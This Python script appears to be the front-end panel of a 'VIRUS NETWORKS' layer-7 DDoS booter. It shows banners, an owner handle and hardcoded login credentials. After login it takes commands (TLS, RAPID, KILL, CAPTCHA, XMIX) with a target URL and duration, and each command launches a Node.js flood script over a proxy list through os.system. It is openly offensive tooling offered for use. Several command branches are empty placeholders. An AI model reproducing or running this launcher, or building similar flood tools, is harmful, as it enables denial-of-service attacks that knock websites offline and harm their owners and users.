# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""

 ██▒   █▓ ██▓ ██▀███   █    ██   ██████ 
▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ 
 ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   
  ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒
   ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒
   ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
   ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░
     ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░  
      ░   ░     ░        ░           ░  
     ░                                  
                                                                                                                   
                                                                                                                                     
                                                                     
                            VIRUS NETWORKS ---- [ LAYER 7 ]
                          
                 | root@Basic |                                  
                          
                   • TLS                                                                   • KILL  
                   • RAPID                                     
                   • CAPTCHA                               
                   • XMIX                                                   
                                                     
                           
                                 
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
██╗   ██╗██╗██████╗ ██╗   ██╗███████╗
██║   ██║██║██╔══██╗██║   ██║██╔════╝
██║   ██║██║██████╔╝██║   ██║███████╗
╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║
 ╚████╔╝ ██║██║  ██║╚██████╔╝███████║
  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                                                                                                                                
                                𝗢𝘄𝗻𝗲𝗿 : @𝙋𝙍𝙊𝙂𝙍𝘼𝙈𝙈𝙀𝙍_𝙃𝘼𝙎𝙄𝘽
                                𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @𝙈𝙍_𝙅𝙊𝙆𝙀𝙍_𝘾𝙔𝘽𝙀𝙍_𝙁𝙊𝙍𝘾𝙀
                                𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻 : 𝗕𝗔𝗦𝗜𝗖
                                𝗣𝗿𝗼𝘅𝘆 : 𝟳𝟲𝟴𝟬𝟱𝟵
                                𝗧𝘆𝗽𝗲 : 𝗠𝗘𝗡𝗨                                                                                                                                     
                                              
""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] VIRUS-NETWORKS :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[31mroot@Networks\x1b[1;31m\:~# \x1b[1;\033[31m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "Method" or sinput == "METHOD" or sinput == ".Method" or sinput == ".METHOD" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "TLS" or sinput == "tls":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-SILIT {target} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "RAPID" or sinput == "rapid":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node RAPID {target} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node improved-tls {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "CAPTCHA" or sinput == "captcha":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node DarkBotnet {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "" or sinput == "":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "" or sinput == "":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "" or sinput == "":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "" or sinput == "":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "XMIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node XMIX.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

def login():
	sys.stdout.write(f"\x1b]2;[\] VIRUS-NETWORKS :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "hasib"
	passwd = "botnet"
	username = input("""\033[33m
	
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣛⣛⣛⣛⡟⣛⣛⣛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣫⢽⣒⡯⣽⡟⡞⡾⡧⢽⣷⣷⢺⣿⢽⣖⡮⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣞⣽⢺⣽⣬⣏⣫⣾⣿⡇⣿⣿⣿⣿⣷⣿⣹⣼⣿⡓⣯⣷⢭⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⡫⣾⡷⣾⣿⣝⢷⢻⢟⣽⣦⡆⣿⣿⣷⡔⡫⣻⣿⡿⣫⣿⣧⣾⣗⢽⣮⣻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⡟⣵⣽⣿⡷⢶⡇⡗⡾⣼⡼⣴⢯⡞⣿⡇⣿⣿⣿⣷⣿⡽⣯⢃⣧⢇⢺⣿⡶⢶⣯⣿⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣟⣾⣿⡣⣽⣿⣷⣷⣝⣾⢿⢹⣿⢸⢪⣻⠧⢿⡿⠿⡟⡗⣵⣿⣇⡗⡵⣫⣞⣼⡿⡯⢝⣿⣳⡹⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⡟⣮⣿⣻⣿⣻⣿⣿⡮⡳⣕⣽⢸⣿⣎⣷⡿⣟⣛⣛⣻⠿⣾⣡⣿⡿⣯⣫⢟⣽⣫⣪⣗⣿⣟⢿⢵⢻⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣳⣿⣝⣯⡿⣛⣓⠝⡮⢪⣻⣯⣼⣿⣿⣷⣽⣛⣿⣿⣛⣯⣾⣿⣿⣧⣽⣟⡟⠿⢻⣟⣛⠷⣹⡩⣿⣏⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣸⣾⣟⢽⣿⣾⣿⢟⣷⢿⣻⣿⣻⡟⣻⢿⣿⣿⠿⠻⣿⣿⡿⣟⢻⣿⣿⣟⡿⣷⡿⣿⣷⣿⣯⣻⣿⣿⢿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣾⣳⣿⣿⡯⣯⣟⡂⠀⠀⢨⣿⣇⣿⣷⣝⣧⠀⠀⣸⣫⣾⣿⢸⣿⡥⠀⠀⢰⡹⡽⢽⣿⣿⣿⣷⣿⣼⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⢹⣿⡎⣿⣟⣿⣽⡼⣿⢿⡿⣙⡼⣿⣝⣿⣿⣴⣿⣿⣆⣿⣿⢯⣿⢯⣟⢿⠿⣿⢷⡇⣿⣻⣻⣶⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣷⣽⣷⣿⣿⣾⢿⣿⣾⣟⢿⣾⣟⢻⣿⣿⣏⣿⣵⡿⣋⢿⢿⡻⣮⣾⣾⡿⣫⣿⣟⣽⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣞⢵⡿⡫⣞⢕⢕⢯⣫⣿⣿⣿⣿⣝⠯⡪⣺⣷⢝⣯⡺⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣪⢾⣷⣵⣽⣾⢿⣟⣵⣮⣟⡿⣷⣯⣾⣿⡿⣝⣴⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣷⣶⣶⣯⣿⣿⣿⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
          ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

                                WELCOME TO VIRUS NETWORKS 
                                              
						   
                        \033[[\033[33musername\033[]:\033[0m """)
	password = getpass.getpass(prompt='                        \033[[\033[33mpassword\033[]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[31m                   ")
		time.sleep(1)
		main()

login()